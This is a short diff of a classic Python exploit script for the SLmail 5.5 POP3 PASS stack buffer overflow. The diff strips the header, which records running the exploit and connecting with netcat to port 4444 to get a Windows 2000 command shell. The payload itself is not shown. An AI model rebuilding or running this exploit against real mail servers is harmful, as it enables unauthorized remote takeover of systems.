@@ -1,21 +1,3 @@
-#########################################################
-#                                                       #
-# SLmail 5.5 POP3 PASS Buffer Overflow               	#
-# Discovered by : Muts                                  #
-# Coded by : Muts                                       #
-# www.offsec.com                                        #
-# Plain vanilla stack overflow in the PASS command  	#
-#                                                       #
-#########################################################
-# D:\Projects\BO>SLmail-5.5-POP3-PASS.py                #
-#########################################################
-# D:\Projects\BO>nc -v 192.168.1.167 4444               #
-# localhost.lan [192.168.1.167] 4444 (?) open           #   
-# Microsoft Windows 2000 [Version 5.00.2195]            #
-# (C) Copyright 1985-2000 Microsoft Corp.               #
-# C:\Program Files\SLmail\System>                       #
-#########################################################
-
 import struct
 import socket
 
@@ -68,4 +50,3 @@ try:
 except:
 	print "Could not connect to POP3!"
 
-# milw0rm.com [2004-11-18]
